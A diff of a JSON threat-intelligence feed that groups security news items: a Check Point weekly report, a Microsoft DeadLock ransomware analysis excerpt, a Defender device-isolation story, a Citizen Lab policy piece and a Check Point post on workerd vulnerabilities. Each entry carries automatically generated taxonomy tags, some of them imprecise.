-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "a36b6d83b6",
-      "priority_score": 11,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach",
-          "web_shell_backdoor"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services"
-        ],
-        "affected_products": [
-          "Anthropic/Claude",
-          "Google/Gemini",
-          "WordPress"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-12537",
-          "CVE-2026-54316",
-          "CVE-2026-64638"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "critical_cvss"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Check Point Research",
-        "cohort": "threat_research_primary",
-        "title": "10th August – Threat Intelligence Report",
-        "link": "https://research.checkpoint.com/2026/10th-august-threat-intelligence-report/",
-        "published": "2026-08-10T13:53:22+00:00",
-        "summary": "For the latest discoveries in cyber research for the week of 10th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES North Carolina Ports, the US authority operating the ports of Wilmington, Morehead City and others, has suffered a cyberattack that forced some operations onto manual processes. The authority claims it has contained […] The post 10th August – Threat Intelligence Report appeared first on Check Point Research .",
-        "full_body": "FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 10th August – Threat Intelligence Report August 10, 2026 https://research.checkpoint.com/2026/10th-august-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 10th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES North Carolina Ports, the US authority operating the ports of Wilmington, Morehead City and others, has suffered a cyberattack that forced some operations onto manual processes. The authority claims it has contained the intrusion, but degraded systems caused delays while affected services were restored. Ryde, an electric scooter operator in Scandinavian countries, has disclosed a data breach affecting all 4.5 million customer accounts across Norway, Sweden, Finland, and Germany. Attackers copied phone numbers, email addresses, birth dates, partial payment card numbers, and payment histories. Full card numbers and ride histories were unaffected. Canadian hardware wallet maker Coinkite has disclosed a theft campaign exploiting a Coldcard firmware vulnerability, with at least 1,367 bitcoin worth about $88.6 million stolen from thousands of addresses. The company halted affected shipments, destroyed vulnerable inventory, and released patched firmware after confirming exploitation against customer wallets. Beacon, a UK provider of customer relationship management software for charities, has disclosed a data breach after attackers compromised an access key. The company notified around 1,500 nonprofit customers that database information, donation records, and stored attachments may have been downloaded. Payment and bank details were not affected. AI THREATS Check Point Research has demonstrated that Cloudflare Code Mode, which allows AI agents to write TypeScript against tools, inherited five vulnerabilities from the workerd runtime. The flaws could enable sandbox escape and cross-tenant data exposure. Cloudflare rated two issues Critical and fixed its managed Workers environment. Researchers have disclosed vulnerabilities in Google Gemini CLI and Anthropic Claude Code that could expose automation environments to code execution and API key theft. CVE-2026-12537, rated CVSS 10.0, affected Gemini CLI workflows, while CVE-2026-54316 affected Claude Code. Both vendors released patched versions. Researchers have detailed AI-enabled identity fraud kits that automate know-your-customer bypasses across banks, fintech companies, and cryptocurrency exchanges. Tools such as ProKYC can generate identity documents, selfie-with-ID images, spoofed location data, and synthetic video used against document, selfie, and liveness checks during remote onboarding. VULNERABILITIES AND PATCHES Cisco has released fixes for multiple critical vulnerabilities in Catalyst SD-WAN and IOS XE software disclosed on August 5. The highest-severity issues carry CVSS scores up to 9.9 and can enable privilege escalation, code execution, or system compromise. Cisco also addressed additional high and medium-severity flaws across network management products. WordPress has released version 7.0.3 to address CVE-2026-64638, a high-severity Core vulnerability known as XSS2Shell. The flaw can turn a failed login into pre-authentication cross-site scripting and, under specific conditions, remote code execution. Fixes were also backported for supported WordPress branches dating to version 4.7. TP-Link has addressed 15 vulnerabilities in its Omada provisioning ecosystem affecting controllers, network devices, mobile applications, and VIGI cameras. The flaws include device impersonation, credential exposure, and remote code execution risks during provisioning. 11 flaws received CVE identifiers, and patched firmware has been released for affected products. A vendor-installed backdoor has been identified across at least 20 Zbtlink router models sold under brands including Wiflyer and ZBT. The remote-management component contacts hardcoded",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "data_breach",
-            "web_shell_backdoor"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services"
-          ],
-          "affected_products": [
-            "Google/Gemini",
-            "Anthropic/Claude",
-            "WordPress"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-12537",
-            "CVE-2026-54316",
-            "CVE-2026-64638"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "critical_cvss"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {
-            "Google/Gemini": "target",
-            "Anthropic/Claude": "target",
-            "WordPress": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Check Point Research",
-          "cohort": "threat_research_primary",
-          "title": "10th August – Threat Intelligence Report",
-          "link": "https://research.checkpoint.com/2026/10th-august-threat-intelligence-report/",
-          "published": "2026-08-10T13:53:22+00:00",
-          "summary": "For the latest discoveries in cyber research for the week of 10th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES North Carolina Ports, the US authority operating the ports of Wilmington, Morehead City and others, has suffered a cyberattack that forced some operations onto manual processes. The authority claims it has contained […] The post 10th August – Threat Intelligence Report appeared first on Check Point Research .",
-          "taxonomy": {
-            "threat_categories": [
-              "data_breach",
-              "web_shell_backdoor"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services"
-            ],
-            "affected_products": [
-              "Google/Gemini",
-              "Anthropic/Claude",
-              "WordPress"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-12537",
-              "CVE-2026-54316",
-              "CVE-2026-64638"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "critical_cvss"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {
-              "Google/Gemini": "target",
-              "Anthropic/Claude": "target",
-              "WordPress": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "a7f7f22b06",
       "priority_score": 11,
       "member_count": 1,
@@ -4110,6 +4032,136 @@
       ]
     },
     {
+      "cluster_id": "963c57eb1b",
+      "priority_score": 10,
+      "member_count": 2,
+      "corroborating_source_count": 2,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "credential_theft",
+          "data_breach",
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "manufacturing_industrial"
+        ],
+        "affected_products": [
+          "Microsoft Defender"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Microsoft Security Blog",
+        "cohort": "threat_research_primary",
+        "title": "DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure",
+        "link": "https://www.microsoft.com/en-us/security/blog/2026/08/10/deadlock-ransomware-breaking-down-a-rust-based-encryptor-with-decentralized-recovery-infrastructure/",
+        "published": "2026-08-10T15:00:00+00:00",
+        "summary": "Microsoft Threat Intelligence examines DeadLock ransomware, an emerging financially motivated operation distinguished by its use of decentralized infrastructure to support victim communications, negotiations, and data leak operations alongside double extortion tactics used to pressure victims. The post DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure appeared first on Microsoft Security Blog .",
+        "full_body": "Share Link copied to clipboard! Tags Credential theft Extortion Ransomware Windows Threats intelligence Cybercrime Ransomware Content types Research Products and services Microsoft Defender Microsoft Defender for Cloud Apps Microsoft Defender for Endpoint Topics Threat intelligence Microsoft Threat Intelligence tracks DeadLock ransomware as an emerging financially motivated operation distinguished by its use of decentralized infrastructure to support victim communications and data leak operations. Its recovery ecosystem combines the Session messaging network with blockchain-backed services that store and deliver resources used throughout the extortion process. This architecture likely increases the resilience of portions of its communication, leak-hosting, and negotiation infrastructure, allowing DeadLock operators to recover from some disruption efforts while maintaining continuity for victims. Microsoft has observed DeadLock ransomware being deployed by multiple groups including an affiliate of the Lynx and INC ransomware ecosystems. First observed in July 2025, DeadLock operators employ double extortion tactics, encrypting victim environments while threatening to publicly release exfiltrated data. As of July 2026, the operators have published more than 80 compromised organizations on their data leak site, called the DeadLock blog, with more than half of the claimed victims in Europe. Microsoft identified DeadLock ransomware impacting organizations across information technology (IT), mining, transportation and logistics, manufacturing, hospitality, consumer goods, and other sectors in Europe, Asia, North America, South America, and Africa. The DeadLock encryptor includes a resource-aware throttling mechanism designed to maintain system responsiveness during encryption. In addition to its encryption capabilities, the ransomware also appears to implement language or country-based geofencing designed to avoid running in environments associated with former Soviet and Commonwealth of Independent States (CIS)-linked countries as well as select Middle Eastern countries, a pattern commonly observed among ransomware operators believed to operate from those regions. Together, these capabilities demonstrate how DeadLock combines established ransomware tradecraft with decentralized infrastructure designed to improve operational resilience. In this blog, we present a technical analysis of the DeadLock ransomware encryptor, covering its execution flow, defense evasion techniques, encryption design, and post-encryption behaviors, including a decentralized recovery chat system. We also provide indicators of compromise (IOCs), Microsoft Defender detections, and mitigation guidance to help organizations defend against this threat and similar ransomware activity. Pre-encryption Configuration parsing Before performing any malicious activity, the DeadLock encryptor decrypts an embedded configuration blob using XOR decoding with an 8-byte key. Below are the malware’s configuration fields and their values. Field Value Victim UID <redacted> Malware public key 03bf50bbf97c4e951e66ff12b689a37a3ce675b4921e254eae76da77573843e4a9 Encryption rule 1000,05052429880,025124288000,010524288000,F991114288000 Language exclude list Geofencing language IDs (see Language geofencing ) Process stop list Processes to terminate (see Process and service termination ) Service stop list Services to stop and delete (see Process and service termination ) File exclude list Extensions and file names to avoid encrypting (see Directory traversal ) Directory exclude list Pre-traversal filter with directories to avoid encrypting (see Directory traversal ) Sub-path Exclude List Sub-paths to avoid encrypting during traversal (see Directory traversal ) Text ransom note Full text ransom note content (see Ransom notes deployment ) HTML recovery chat Full HTML/JS interactive chat page (see Recovery chat: Technical architecture ) Language geofencing As an early exit check, the malware ",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "credential_theft",
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "manufacturing_industrial"
+          ],
+          "affected_products": [
+            "Microsoft Defender"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {
+            "Microsoft Defender": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Microsoft Security Blog",
+          "cohort": "threat_research_primary",
+          "title": "DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure",
+          "link": "https://www.microsoft.com/en-us/security/blog/2026/08/10/deadlock-ransomware-breaking-down-a-rust-based-encryptor-with-decentralized-recovery-infrastructure/",
+          "published": "2026-08-10T15:00:00+00:00",
+          "summary": "Microsoft Threat Intelligence examines DeadLock ransomware, an emerging financially motivated operation distinguished by its use of decentralized infrastructure to support victim communications, negotiations, and data leak operations alongside double extortion tactics used to pressure victims. The post DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure appeared first on Microsoft Security Blog .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "credential_theft",
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "manufacturing_industrial"
+            ],
+            "affected_products": [
+              "Microsoft Defender"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {
+              "Microsoft Defender": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Microsoft Threat Intelligence",
+          "cohort": "threat_research_primary",
+          "title": "DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure",
+          "link": "https://www.microsoft.com/en-us/security/blog/2026/08/10/deadlock-ransomware-breaking-down-a-rust-based-encryptor-with-decentralized-recovery-infrastructure/",
+          "published": "2026-08-10T15:00:00+00:00",
+          "summary": "Microsoft Threat Intelligence examines DeadLock ransomware, an emerging financially motivated operation distinguished by its use of decentralized infrastructure to support victim communications, negotiations, and data leak operations alongside double extortion tactics used to pressure victims. The post DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure appeared first on Microsoft Security Blog .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "b9f78fb1fa",
       "priority_score": 10,
       "member_count": 1,
@@ -4119,6 +4171,7 @@
       ],
       "taxonomy": {
         "threat_categories": [
+          "credential_theft",
           "ransomware_extortion"
         ],
         "actor_attribution": [],
@@ -4144,11 +4197,12 @@
         "link": "https://www.microsoft.com/en-us/security/blog/2026/08/04/129-seconds-disruption-microsoft-defender-stops-ransomware-qnet/",
         "published": "2026-08-04T17:54:04+00:00",
         "summary": "Microsoft Defender automatically isolated a compromised QNET endpoint in 128 seconds, stopping a multi-stage attack before the payload could persist or spread. The post 128 Seconds to disruption: Microsoft Defender stops ransomware at QNET appeared first on Microsoft Security Blog .",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
+        "full_body": "Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Topics Actionable threat insights Detection and protection success stories Microsoft Defender’s attack disruption now includes device isolation, a new response action that extends autonomous protection directly to compromised endpoints. At QNET, an attacker initiated a multi-stage attack using a legitimate Windows tool on a compromised endpoint to retrieve a malicious remote payload–a classic living-off-the-land (LOL) technique that often evades traditional containment. By automatically enforcing the new device isolation action on the compromised endpoint, Defender attack disruption stopped the attack dead in its tracks. From the first high-severity alert to completed isolation, after only 128 seconds, Defender cut off the attack chain before the second-stage payload could establish persistence or move beyond the host. The growing threat: when the endpoint is the blast radius Attack disruption has proven highly effective at stopping multistage, cross-domain attacks by disrupting the attacker’s ability to move across the environment. In many identity-driven attack scenarios, containing the compromised user is enough to shut down the attack chain, preventing lateral movement and limiting the attacker’s ability to access additional systems, identities, and resources. However, we are increasingly seeing a different class of high-severity incidents that begin with initial access directly on the device. Once adversaries establish a foothold on an endpoint, they can plant multiple persistence mechanisms and continue operating locally on the machine. This means that acting against the user’s identity alone is no longer enough to dismantle the threat. In these scenarios, the attacker has multiple ways to communicate and operate on the device beyond the user entity; the malicious code is already executing locally on the machine. The attacker doesn’t have to move laterally immediately; they can establish persistence, steal credentials, inject into processes, and prepare follow-on stages directly from the compromised endpoint itself. Previously, stopping these attacks required manual triage and response, giving attackers time to advance. Device isolation closes this gap by automatically correlating signals, assessing the threat, and isolating the compromised device within seconds. Traditional response approaches often depend on static playbooks triggered by individual alerts and maintained through manual tuning. Attack disruption instead uses AI-driven correlation and real-time analysis to identify multi-stage attacks by connecting signals across the environment before taking action. Device isolation is enforced only when the disruption pipeline reaches a high-confidence verdict—a threshold maintained at 99% precision. What is device isolation? When Microsoft Defender determines with high confidence that an endpoint is compromised, it isolates the device to immediately stop attacker activity and reduce the risk of further impact, such as data exfiltration and lateral movement. What happens during device Isolation When a device is isolated, all external network connectivity is blocked while maintaining access to required security services like Microsoft Defender for Endpoint. Selective isolation is supported, allowing customer-defined services or exclusions to continue functioning. Automatic device isolation is scoped to the affected device (supported today on onboarded MDE workstations), time-limited, and operator-controlled. Security teams can review context, take follow-up actions, and manually release isolation when it’s safe to do so. Why it matters Device isolation is a powerful containment control because it disrupts the attack regardless of how the device was compromised or what the attacker planned to do next. A single action cuts off network access, breaking lateral movement, command and control, credential theft, and rapid encryption–",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
-            "ransomware_extortion"
+            "ransomware_extortion",
+            "credential_theft"
           ],
           "actor_attribution": [],
           "affected_industries": [],
@@ -4179,7 +4233,8 @@
           "summary": "Microsoft Defender automatically isolated a compromised QNET endpoint in 128 seconds, stopping a multi-stage attack before the payload could persist or spread. The post 128 Seconds to disruption: Microsoft Defender stops ransomware at QNET appeared first on Microsoft Security Blog .",
           "taxonomy": {
             "threat_categories": [
-              "ransomware_extortion"
+              "ransomware_extortion",
+              "credential_theft"
             ],
             "actor_attribution": [],
             "affected_industries": [],
@@ -4194,6 +4249,326 @@
             "confidence_tier": "tier_1_primary_research",
             "role_map": {
               "Microsoft Defender": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "3e123aa6ec",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "web_shell_backdoor"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Citizen Lab",
+        "cohort": "threat_research_primary",
+        "title": "Immigration Policy: The Backdoor to Transnational Repression",
+        "link": "https://citizenlab.ca/immigration-policy-the-backdoor-to-transnational-repression/",
+        "published": "2026-08-05T13:45:26+00:00",
+        "summary": "Citizen Lab researchers write that restrictive immigration policies are incompatible with attempts to counter transnational repression. The post Immigration Policy: The Backdoor to Transnational Repression appeared first on The Citizen Lab .",
+        "full_body": "Date Published August 5, 2026 Topics Digital Transnational Repression Law & Policy immigration , transnational repression Mentions Siena Anstis Marcus Michaelsen Kate Pundyk Share Citizen Lab researchers Siena Anstis, Marcus Michaelsen, and Kate Pundyk write for the Foreign Policy Centre that the increasingly restrictive migration policies of democratic countries are incompatible with their claims of countering transnational repression. The authors argue that “host states cannot claim to counter repression across borders while ignoring the role their immigration policies play in enabling it.” Read More in: Digital Transnational Repression LATEST This submission analyzes Bill C-22, the Lawful Access Act, which would enact broad surveillance obligations and reforms in Canada. Issues include: the bill’s sweeping scope, significant constitutional and human rights risks, transparency and accountability deficits, and dangers to encryption and Canada’s cybersecurity. We recommend entirely withdrawing several elements of the bill and suggest amendments to mitigate harms. June 2, 2026 Law & Policy News + Updates → Podcast Kate Robertson on the Risks That Lie Behind Canada’s Unexpected Signing of the UN Cybercrime Convention JULY 31, 2026 research → External Publication How to Combat Transnational Repression JULY 2, 2026 event Confronting Transnational Repression Building Knowledge and Solidarities Across Communities, Civil Society, and Academia JUNE 22, 2026",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "web_shell_backdoor"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Citizen Lab",
+          "cohort": "threat_research_primary",
+          "title": "Immigration Policy: The Backdoor to Transnational Repression",
+          "link": "https://citizenlab.ca/immigration-policy-the-backdoor-to-transnational-repression/",
+          "published": "2026-08-05T13:45:26+00:00",
+          "summary": "Citizen Lab researchers write that restrictive immigration policies are incompatible with attempts to counter transnational repression. The post Immigration Policy: The Backdoor to Transnational Repression appeared first on The Citizen Lab .",
+          "taxonomy": {
+            "threat_categories": [
+              "web_shell_backdoor"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "a36b6d83b6",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "web_shell_backdoor"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services"
+        ],
+        "affected_products": [
+          "Anthropic/Claude",
+          "Google/Gemini",
+          "WordPress"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-12537",
+          "CVE-2026-54316",
+          "CVE-2026-64638"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "critical_cvss"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Check Point Research",
+        "cohort": "threat_research_primary",
+        "title": "10th August – Threat Intelligence Report",
+        "link": "https://research.checkpoint.com/2026/10th-august-threat-intelligence-report/",
+        "published": "2026-08-10T13:53:22+00:00",
+        "summary": "For the latest discoveries in cyber research for the week of 10th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES North Carolina Ports, the US authority operating the ports of Wilmington, Morehead City and others, has suffered a cyberattack that forced some operations onto manual processes. The authority claims it has contained […] The post 10th August – Threat Intelligence Report appeared first on Check Point Research .",
+        "full_body": "FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 10th August – Threat Intelligence Report August 10, 2026 https://research.checkpoint.com/2026/10th-august-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 10th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES North Carolina Ports, the US authority operating the ports of Wilmington, Morehead City and others, has suffered a cyberattack that forced some operations onto manual processes. The authority claims it has contained the intrusion, but degraded systems caused delays while affected services were restored. Ryde, an electric scooter operator in Scandinavian countries, has disclosed a data breach affecting all 4.5 million customer accounts across Norway, Sweden, Finland, and Germany. Attackers copied phone numbers, email addresses, birth dates, partial payment card numbers, and payment histories. Full card numbers and ride histories were unaffected. Canadian hardware wallet maker Coinkite has disclosed a theft campaign exploiting a Coldcard firmware vulnerability, with at least 1,367 bitcoin worth about $88.6 million stolen from thousands of addresses. The company halted affected shipments, destroyed vulnerable inventory, and released patched firmware after confirming exploitation against customer wallets. Beacon, a UK provider of customer relationship management software for charities, has disclosed a data breach after attackers compromised an access key. The company notified around 1,500 nonprofit customers that database information, donation records, and stored attachments may have been downloaded. Payment and bank details were not affected. AI THREATS Check Point Research has demonstrated that Cloudflare Code Mode, which allows AI agents to write TypeScript against tools, inherited five vulnerabilities from the workerd runtime. The flaws could enable sandbox escape and cross-tenant data exposure. Cloudflare rated two issues Critical and fixed its managed Workers environment. Researchers have disclosed vulnerabilities in Google Gemini CLI and Anthropic Claude Code that could expose automation environments to code execution and API key theft. CVE-2026-12537, rated CVSS 10.0, affected Gemini CLI workflows, while CVE-2026-54316 affected Claude Code. Both vendors released patched versions. Researchers have detailed AI-enabled identity fraud kits that automate know-your-customer bypasses across banks, fintech companies, and cryptocurrency exchanges. Tools such as ProKYC can generate identity documents, selfie-with-ID images, spoofed location data, and synthetic video used against document, selfie, and liveness checks during remote onboarding. VULNERABILITIES AND PATCHES Cisco has released fixes for multiple critical vulnerabilities in Catalyst SD-WAN and IOS XE software disclosed on August 5. The highest-severity issues carry CVSS scores up to 9.9 and can enable privilege escalation, code execution, or system compromise. Cisco also addressed additional high and medium-severity flaws across network management products. WordPress has released version 7.0.3 to address CVE-2026-64638, a high-severity Core vulnerability known as XSS2Shell. The flaw can turn a failed login into pre-authentication cross-site scripting and, under specific conditions, remote code execution. Fixes were also backported for supported WordPress branches dating to version 4.7. TP-Link has addressed 15 vulnerabilities in its Omada provisioning ecosystem affecting controllers, network devices, mobile applications, and VIGI cameras. The flaws include device impersonation, credential exposure, and remote code execution risks during provisioning. 11 flaws received CVE identifiers, and patched firmware has been released for affected products. A vendor-installed backdoor has been identified across at least 20 Zbtlink router models sold under brands including Wiflyer and ZBT. The remote-management component contacts hardcoded",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "data_breach",
+            "web_shell_backdoor"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services"
+          ],
+          "affected_products": [
+            "Google/Gemini",
+            "Anthropic/Claude",
+            "WordPress"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-12537",
+            "CVE-2026-54316",
+            "CVE-2026-64638"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "critical_cvss"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {
+            "Google/Gemini": "target",
+            "Anthropic/Claude": "target",
+            "WordPress": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Check Point Research",
+          "cohort": "threat_research_primary",
+          "title": "10th August – Threat Intelligence Report",
+          "link": "https://research.checkpoint.com/2026/10th-august-threat-intelligence-report/",
+          "published": "2026-08-10T13:53:22+00:00",
+          "summary": "For the latest discoveries in cyber research for the week of 10th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES North Carolina Ports, the US authority operating the ports of Wilmington, Morehead City and others, has suffered a cyberattack that forced some operations onto manual processes. The authority claims it has contained […] The post 10th August – Threat Intelligence Report appeared first on Check Point Research .",
+          "taxonomy": {
+            "threat_categories": [
+              "data_breach",
+              "web_shell_backdoor"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services"
+            ],
+            "affected_products": [
+              "Google/Gemini",
+              "Anthropic/Claude",
+              "WordPress"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-12537",
+              "CVE-2026-54316",
+              "CVE-2026-64638"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "critical_cvss"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {
+              "Google/Gemini": "target",
+              "Anthropic/Claude": "target",
+              "WordPress": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "2ba7372881",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ai_security",
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services"
+        ],
+        "affected_products": [
+          "Android",
+          "OpenAI/ChatGPT"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "poc_available"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Check Point Research",
+        "cohort": "threat_research_primary",
+        "title": "When Agentic Glue Melts: Exploiting Cloudflare Code Mode and Workers",
+        "link": "https://research.checkpoint.com/2026/when-agentic-glue-melts/",
+        "published": "2026-08-06T22:20:00+00:00",
+        "summary": "By Yarden Porat, Check Point Research Key Points The short version We set out to break Cloudflare Code Mode, and ended up breaking Cloudflare Workers too. We did both by targeting workerd, the runtime beneath both: an in-process sandbox that relies entirely on V8 to isolate untrusted code. We found five memory-corruption bugs in workerd’s native C++ (the “glue” […] The post When Agentic Glue Melts: Exploiting Cloudflare Code Mode and Workers appeared first on Check Point Research .",
+        "full_body": "CATEGORIES AI Research 18 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 464 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 420 How To Guides 13 Ransomware 5 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 When Agentic Glue Melts: Exploiting Cloudflare Code Mode and Workers August 7, 2026 https://research.checkpoint.com/2026/when-agentic-glue-melts/ By Yarden Porat, Check Point Research Key Points Check Point Research analyzed Cloudflare Code Mode, a technique that changes how AI agents use MCP by turning tools into a TypeScript API the model can write code against. The research uncovered five vulnerabilities in workerd, the open-source runtime behind Code Mode and Cloudflare Workers. Two were rated Critical by Cloudflare. The blast radius is broad: by Cloudflare’s own numbers, Workers is built by millions of developers ,[1] serves millions of requests per second ,[2] and carries more than 10% of all traffic on Cloudflare’s network .[3] Because workerd underpins both Code Mode sandboxes and Workers tenant isolation, the findings create sandbox-escape and cross-tenant exposure risk. Cloudflare’s managed Workers environment has been fixed in production. Self-hosted workerd / Code Mode deployments should update to v1.20260619.1. Check Point Research released proof-of-concept code as part of its Black Hat USA 2026 presentation. The short version We set out to break Cloudflare Code Mode , and ended up breaking Cloudflare Workers too. We did both by targeting workerd , the runtime beneath both: an in-process sandbox that relies entirely on V8 to isolate untrusted code. We found five memory-corruption bugs in workerd’s native C++ (the “glue” between JavaScript and the runtime), and turned them into two end-to-end attacks: Cross-tenant heap swipe. An out-of-bounds read in URLPattern lets one Worker reach across the shared process heap and swipe another tenant’s secrets . 